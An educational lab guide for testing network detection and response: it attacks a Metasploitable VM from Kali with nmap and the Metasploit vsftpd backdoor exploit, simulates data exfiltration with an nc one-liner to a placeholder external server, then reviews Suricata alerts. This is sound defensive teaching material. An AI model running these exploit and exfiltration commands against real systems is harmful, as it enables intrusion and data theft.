# Exploring Network Detection and Response (NDR) with Kali Linux and Metasploitable

## Objective

The purpose of this lab is to provide hands-on experience with Network Detection and Response (NDR) solutions by simulating real-world attacks using Kali Linux and Metasploitable. Participants will learn how to identify vulnerabilities, exploit them, and analyze how an NDR system detects and responds to malicious activities within a network.

## Prerequisites
- Basic understanding of network security concepts.
- Familiarity with penetration testing tools (e.g., Metasploit).
- Access to a virtual lab environment with Hyper-V installed.

## Lab Environment
- Kali Linux: A powerful penetration testing distribution that includes numerous tools for ethical hacking and network security assessments.
- Metasploitable: An intentionally vulnerable Linux distribution designed for testing and training purposes. It allows participants to practice penetration testing techniques.
- NDR Solution (e.g., Suricata or Zeek): An open-source monitoring tool that provides visibility into network traffic, detects anomalies, and can simulate some NDR functionalities.

## Key Learning Outcomes
- Understand the principles of NDR and its importance in modern cybersecurity.
- Gain hands-on experience in reconnaissance, exploitation, and post-exploitation techniques.
- Analyze alerts and logs generated by the NDR solution during simulated attacks.
- Discuss the effectiveness of NDR in detecting and mitigating threats.

## Lab Activities
- Reconnaissance: Use nmap to scan the Metasploitable VM, identifying open ports and services.
- Exploitation: Utilize Metasploit to exploit vulnerabilities in Metasploitable, demonstrating common attack techniques.
- Post-Exploitation: Simulate actions an attacker might take after gaining access, such as privilege escalation and data exfiltration.
- Monitoring and Analysis: Observe and analyze alerts generated by the NDR solution, discussing detection capabilities and incident response.

Lab Activities
Activity 1: Reconnaissance
Objective: Identify open ports and services on the Metasploitable VM.

Steps:

Open a terminal in Kali Linux.
Run Nmap to scan the Metasploitable VM:
bash
Copy code
nmap -sS -sV -p- <Metasploitable_IP>
Analyze the output to identify open ports and running services.
Activity 2: Exploitation
Objective: Exploit vulnerabilities in Metasploitable to simulate an attack.

Steps:

Launch Metasploit:
bash
Copy code
msfconsole
Search for available exploits for Metasploitable services (e.g., vsftpd):
bash
Copy code
search vsftpd
Select and configure the exploit:
bash
Copy code
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <Metasploitable_IP>
exploit
Verify access by interacting with the session.
Activity 3: Post-Exploitation Actions
Objective: Simulate actions an attacker might take after gaining access.

Steps:

Privilege Escalation (if applicable):
Attempt to escalate privileges using techniques like sudo -l.
Data Gathering:
Run commands to gather system information:
bash
Copy code
uname -a
whoami
Simulated Data Exfiltration:
Use a command to send data to a controlled external server (or simply log it):
bash
Copy code
echo "Sensitive Data" | nc <your_external_server_IP> <port>
Activity 4: Monitoring and Analysis
Objective: Simulate monitoring and analyze alerts related to the activities performed.

Install and Run an Open-Source NDR Tool:

If using Suricata:
Install Suricata:
bash
Copy code
sudo apt update
sudo apt install suricata
Configure Suricata to monitor the appropriate network interface.
Start Suricata:
bash
Copy code
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
Review Logs:

Check logs for alerts generated during the reconnaissance, exploitation, and post-exploitation activities:
bash
Copy code
cat /var/log/suricata/fast.log
Discussion and Analysis
Review the types of attacks conducted and how they might be detected by an NDR solution.
Analyze the alerts generated by Suricata or expected alerts from typical NDR systems.
Discuss how the knowledge gained can be applied to enhance network security measures.

## Summary
Kali Linux: This is where you perform reconnaissance, exploitation, and analysis of alerts using tools like Nmap, Metasploit, and Suricata.
Metasploitable: You'll log in here to get the IP address and potentially as a target for the attacks.

## Ethical Considerations
This lab is intended for educational purposes only. Participants are reminded to operate within a controlled environment and adhere to ethical hacking principles. All activities should be performed in compliance with relevant laws and organizational policies.
